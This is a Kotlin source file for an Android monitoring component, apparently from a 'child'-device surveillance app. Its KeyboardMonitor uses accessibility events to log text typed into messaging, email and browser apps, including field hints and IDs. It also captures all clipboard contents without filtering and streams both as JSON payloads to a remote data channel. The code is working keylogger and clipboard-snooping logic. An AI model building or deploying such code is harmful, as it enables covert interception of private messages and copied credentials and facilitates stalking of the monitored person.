package nexus.android.child.components.keyboard

import android.content.ClipboardManager
import android.content.Context
import android.text.InputType
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.*
import java.util.concurrent.ConcurrentHashMap
import kotlin.coroutines.CoroutineContext

/**
 * Production-grade KeyboardMonitor for tracking keyboard input and clipboard.
 * Monitors text changes in EditText fields and clipboard operations.
 */
class KeyboardMonitor private constructor(private val appContext: Context) : CoroutineScope {

    companion object {
        @Volatile private var _instance: KeyboardMonitor? = null
        fun init(context: Context) {
            _instance = KeyboardMonitor(context.applicationContext)
        }
        val instance: KeyboardMonitor
            get() = _instance ?: throw IllegalStateException("KeyboardMonitor not initialized")
            
        private const val TAG = "KeyboardMonitor"
    }

    private val job = SupervisorJob()
    override val coroutineContext: CoroutineContext = Dispatchers.IO + job

    // App name mapping
    private val appNames = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "org.telegram.messenger" to "Telegram",
        "com.snapchat.android" to "Snapchat",
        "com.facebook.orca" to "Messenger",
        "com.facebook.katana" to "Facebook",
        "com.google.android.gm" to "Gmail",
        "com.android.chrome" to "Chrome",
        "com.google.android.apps.messaging" to "Messages"
    )

    // State tracking
    private val lastTextByField = ConcurrentHashMap<String, String>()
    private var lastClipboardText: String? = null
    
    @Volatile private var dataClient: DataChannelClient? = null
    private var clipboardManager: ClipboardManager? = null

    init {
        // Initialize clipboard manager
        try {
            clipboardManager = appContext.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            setupClipboardListener()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize clipboard manager", e)
        }
    }

    fun setDataChannelClient(client: DataChannelClient?) {
        dataClient = client
        Log.d(TAG, "DataChannel client ${if (client != null) "attached" else "detached"}")
    }

    fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    launch { handleTextChanged(event) }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    launch { handleViewFocused(event) }
                }
            }
        } catch (t: Throwable) {
            Log.e(TAG, "Event handling error", t)
        }
    }

    private suspend fun handleTextChanged(event: AccessibilityEvent) {
        withContext(Dispatchers.Default) {
            val source = event.source ?: return@withContext
            
            try {
                val pkg = event.packageName?.toString() ?: return@withContext
                val className = source.className?.toString() ?: ""
                
                // Only process EditText fields
                if (!className.contains("EditText")) return@withContext
                
                val text = event.text?.joinToString("") ?: ""
                if (text.isBlank()) return@withContext
                
                // Get field identifier
                val fieldId = try {
                    source.viewIdResourceName ?: "unknown"
                } catch (_: Throwable) {
                    "unknown"
                }
                
                val fieldKey = "$pkg:$fieldId"
                
                // Check if text actually changed
                val lastText = lastTextByField[fieldKey]
                if (text == lastText) return@withContext
                
                lastTextByField[fieldKey] = text
                
                // Extract field information
                val fieldHint = source.hintText?.toString()
                val inputType = source.inputType
                val isPassword = isPasswordField(inputType)
                
                // Don't send password content, just notify it's a password field
                val textToSend = if (isPassword) "[PASSWORD]" else text
                
                sendKeyboardInput(
                    pkg = pkg,
                    text = textToSend,
                    fieldHint = fieldHint,
                    fieldId = fieldId,
                    inputType = getInputTypeString(inputType),
                    isPassword = isPassword
                )
                
            } catch (e: Exception) {
                Log.e(TAG, "handleTextChanged error", e)
            } finally {
                source.recycle()
            }
        }
    }

    private suspend fun handleViewFocused(event: AccessibilityEvent) {
        withContext(Dispatchers.Default) {
            val source = event.source ?: return@withContext
            
            try {
                val pkg = event.packageName?.toString() ?: return@withContext
                val className = source.className?.toString() ?: ""
                
                // Only process EditText fields
                if (!className.contains("EditText")) return@withContext
                
                val fieldHint = source.hintText?.toString()
                val inputType = source.inputType
                val isPassword = isPasswordField(inputType)
                
                // Notify field focus (useful for tracking which fields user interacts with)
                Log.d(TAG, "Field focused: $pkg - $fieldHint (password: $isPassword)")
                
            } catch (e: Exception) {
                Log.e(TAG, "handleViewFocused error", e)
            } finally {
                source.recycle()
            }
        }
    }

    private fun setupClipboardListener() {
        clipboardManager?.addPrimaryClipChangedListener {
            launch {
                try {
                    val clip = clipboardManager?.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        val text = clip.getItemAt(0).text?.toString()
                        
                        if (!text.isNullOrBlank() && text != lastClipboardText) {
                            lastClipboardText = text
                            
                            // Get foreground app
                            val pkg = getForegroundApp()
                            
                            sendClipboardCopy(
                                pkg = pkg,
                                text = text
                            )
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Clipboard listener error", e)
                }
            }
        }
    }

    private fun sendKeyboardInput(
        pkg: String,
        text: String,
        fieldHint: String?,
        fieldId: String,
        inputType: String,
        isPassword: Boolean
    ) {
        if (!KeyboardController.isMonitoringEnabled()) return
        
        val payload = KeyboardPayload(
            childId = getChildId(),
            type = "KEYBOARD_INPUT",
            data = KeyboardData(
                app = pkg,
                appName = appNames[pkg] ?: pkg,
                inputType = inputType,
                text = text,
                fieldHint = fieldHint,
                fieldId = fieldId,
                isPassword = isPassword
            )
        )
        
        sendPayload(payload)
    }
    
    private fun sendClipboardCopy(pkg: String, text: String) {
        if (!KeyboardController.isMonitoringEnabled()) return
        
        val payload = KeyboardPayload(
            childId = getChildId(),
            type = "CLIPBOARD_COPY",
            data = KeyboardData(
                app = pkg,
                appName = appNames[pkg] ?: pkg,
                inputType = "CLIPBOARD",
                text = text
            )
        )
        
        sendPayload(payload)
    }

    private fun sendPayload(payload: KeyboardPayload) {
        val json = KeyboardJson.toJson(payload)
        val client = dataClient
        
        val sent = try {
            client?.send(json) ?: false
        } catch (t: Throwable) {
            Log.e(TAG, "sendPayload error", t)
            false
        }
        
        if (sent) {
            Log.d(TAG, "✅ Sent ${payload.type} for ${payload.data.appName}")
        } else {
            Log.w(TAG, "⚠️ Failed to send payload - DataChannel not ready")
        }
    }

    private fun isPasswordField(inputType: Int): Boolean {
        val passwordTypes = listOf(
            InputType.TYPE_TEXT_VARIATION_PASSWORD,
            InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD,
            InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD,
            InputType.TYPE_NUMBER_VARIATION_PASSWORD
        )
        
        return passwordTypes.any { (inputType and it) == it }
    }

    private fun getInputTypeString(inputType: Int): String {
        return when {
            isPasswordField(inputType) -> "PASSWORD"
            (inputType and InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) != 0 -> "EMAIL"
            (inputType and InputType.TYPE_TEXT_VARIATION_URI) != 0 -> "URL"
            (inputType and InputType.TYPE_CLASS_NUMBER) != 0 -> "NUMBER"
            (inputType and InputType.TYPE_CLASS_PHONE) != 0 -> "PHONE"
            else -> "TEXT"
        }
    }

    private fun getForegroundApp(): String {
        // This would require UsageStatsManager or ActivityManager
        // For now, return unknown
        return "unknown"
    }

    private fun getChildId(): String {
        return try {
            val prefs = appContext.getSharedPreferences("phantom_prefs", Context.MODE_PRIVATE)
            prefs.getString("device_id", "CHILD-UNKNOWN") ?: "CHILD-UNKNOWN"
        } catch (_: Throwable) {
            "CHILD-UNKNOWN"
        }
    }

    fun shutdown() {
        Log.d(TAG, "Shutting down KeyboardMonitor")
        lastTextByField.clear()
        job.cancel()
    }
}
